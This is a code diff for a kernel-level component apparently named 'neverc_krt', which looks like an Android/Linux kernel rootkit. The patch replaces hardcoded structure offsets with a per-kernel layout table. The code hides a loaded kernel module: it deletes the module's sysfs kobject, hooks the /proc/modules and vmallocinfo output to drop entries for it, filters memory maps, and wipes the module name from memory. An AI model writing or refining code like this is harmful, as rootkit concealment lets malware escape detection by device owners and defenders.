@@ -22,7 +22,8 @@ static int _neverc_krt_vmalloc_interposed;
 static __always_inline struct list_head *
 _neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
 {
-	return (struct list_head *)((char *)mod + NEVERC_KRT_OFF_LIST);
+	return (struct list_head *)((char *)mod +
+		_neverc_krt_get_gki_layout()->module_list);
 }
 
 /* ---- internal typedefs ---- */
@@ -30,7 +31,6 @@ _neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
 typedef void (*neverc_krt_mutex_lock_fn)(void *);
 typedef void (*neverc_krt_mutex_unlock_fn)(void *);
 typedef void (*neverc_krt_kobject_del_fn)(void *kobj);
-typedef void (*neverc_krt_kobject_put_fn)(void *kobj);
 typedef int  (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
 typedef int  (*neverc_krt_mod_addr_fn)(unsigned long addr);
 typedef int  (*neverc_krt_vmalloc_show_fn)(void *seq, void *v);
@@ -42,11 +42,6 @@ struct neverc_krt_vis_maps_filter_region {
 	unsigned long end;
 };
 
-struct _neverc_krt_vmap_area {
-	unsigned long va_start;
-	unsigned long va_end;
-};
-
 /* ---- internal variables ---- */
 
 static struct neverc_krt_vis_maps_filter_region _neverc_krt_maps_regions[NEVERC_KRT_VIS_MAPS_FILTER_MAX];
@@ -56,7 +51,6 @@ static neverc_krt_mutex_lock_fn   _neverc_krt_vis_mutex_lock;
 static neverc_krt_mutex_unlock_fn _neverc_krt_vis_mutex_unlock;
 static void                      *_neverc_krt_module_mutex;
 static neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
-static neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
 static int                        _neverc_krt_vis_inited;
 
 static neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
@@ -85,8 +79,6 @@ int neverc_krt_vis_init(void)
 	_neverc_krt_module_mutex = (void *)NEVERC_KRT_LOOKUP("module_mutex");
 	_neverc_krt_kobject_del =
 		(neverc_krt_kobject_del_fn)NEVERC_KRT_LOOKUP("kobject_del");
-	_neverc_krt_kobject_put =
-		(neverc_krt_kobject_put_fn)NEVERC_KRT_LOOKUP("kobject_put");
 
 	_neverc_krt_vis_inited = 1;
 	return 0;
@@ -181,35 +173,25 @@ int neverc_krt_vis_is_filtered(const struct neverc_krt_vis_state *state)
 void neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
 				 struct neverc_krt_this_module *mod)
 {
-	void *mkobj = (void *)0;
+	const struct neverc_krt_gki_layout *layout;
+	unsigned long name;
+	void *kobj;
 
-	if (state->sysfs_removed) return;
+	if (!state || !mod || state->sysfs_removed || !_neverc_krt_kobject_del)
+		return;
 
-	unsigned long kobj_off = NEVERC_KRT_OFF_NAME + 64;
-	unsigned char *base = (unsigned char *)mod;
-	unsigned long i;
-	for (i = kobj_off; i < kobj_off + 256; i += 8) {
-		unsigned long v;
-		if (neverc_krt_mem_read(&v, base + i, 8))
-			continue;
-		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
-			unsigned long pp_val;
-			if (neverc_krt_mem_read(&pp_val, (void *)v, 8))
-				continue;
-			if (pp_val > 0xFFFF000000000000UL) {
-				mkobj = (void *)v;
-				break;
-			}
-		}
-	}
+	layout = _neverc_krt_get_gki_layout();
+	kobj = (unsigned char *)mod + layout->module_kobj;
+	if (neverc_krt_mem_read(
+		    &name, (unsigned char *)kobj + layout->kobject_name,
+		    sizeof(name)) ||
+	    name < 0xFFFF000000000000UL ||
+	    name >= 0xFFFFFFFFFFFFF000UL)
+		return;
 
-	if (!mkobj) return;
-
-	if (_neverc_krt_kobject_del) {
-		_neverc_krt_kobject_del(mkobj);
-		state->saved_kobj = mkobj;
-		state->sysfs_removed = 1;
-	}
+	_neverc_krt_kobject_del(kobj);
+	state->saved_kobj = kobj;
+	state->sysfs_removed = 1;
 }
 
 /* ==================================================================== */
@@ -222,12 +204,17 @@ static int _neverc_krt_mod_seq_show_filter(void *seq, void *v)
 		return 0;
 
 	if (v && _neverc_krt_vis_target_name) {
+		const struct neverc_krt_gki_layout *layout =
+			_neverc_krt_get_gki_layout();
 		unsigned long list_addr = (unsigned long)v;
 		if (list_addr >= 0xFFFF000000000000UL &&
 		    list_addr < 0xFFFFFFFFFFFFF000UL) {
-			unsigned long mod_base = list_addr - NEVERC_KRT_OFF_LIST;
+			unsigned long mod_base = list_addr - layout->module_list;
 			char nbuf[64];
-			if (!neverc_krt_mem_read(nbuf, (void *)(mod_base + NEVERC_KRT_OFF_NAME), sizeof(nbuf)) &&
+			if (!neverc_krt_mem_read(
+				    nbuf,
+				    (void *)(mod_base + layout->module_name),
+				    sizeof(nbuf)) &&
 			    nbuf[0] >= 0x20 && nbuf[0] <= 0x7E) {
 				nbuf[sizeof(nbuf) - 1] = '\0';
 				if (_neverc_krt_str_starts_with(nbuf,
@@ -363,9 +350,11 @@ void neverc_krt_vis_maps_filter_add_self(void)
 
 void neverc_krt_vis_wipe_modinfo(struct neverc_krt_this_module *mod)
 {
+	const struct neverc_krt_gki_layout *layout =
+		_neverc_krt_get_gki_layout();
 	volatile unsigned char *p = (volatile unsigned char *)mod;
 	unsigned long i;
-	unsigned long name_start = NEVERC_KRT_OFF_NAME;
+	unsigned long name_start = layout->module_name;
 	for (i = name_start; i < name_start + 56 && i < _neverc_krt_get_module_size(); i++)
 		p[i] = 0;
 }
@@ -379,9 +368,12 @@ static int _neverc_krt_vmalloc_show_filter(void *seq, void *v)
 	if (!_neverc_krt_orig_vmalloc_show) return 0;
 
 	if (v && _neverc_krt_vmalloc_vis_start) {
-		struct _neverc_krt_vmap_area *va = (struct _neverc_krt_vmap_area *)v;
+		const struct neverc_krt_gki_layout *layout =
+			_neverc_krt_get_gki_layout();
 		unsigned long start = 0;
-		if (!neverc_krt_mem_read(&start, &va->va_start, 8) && start) {
+		if (!neverc_krt_mem_read(
+			    &start, (const char *)v + layout->vmap_va_start,
+			    sizeof(start)) && start) {
 			if (start >= _neverc_krt_vmalloc_vis_start &&
 			    start < _neverc_krt_vmalloc_vis_end)
 				return 0;
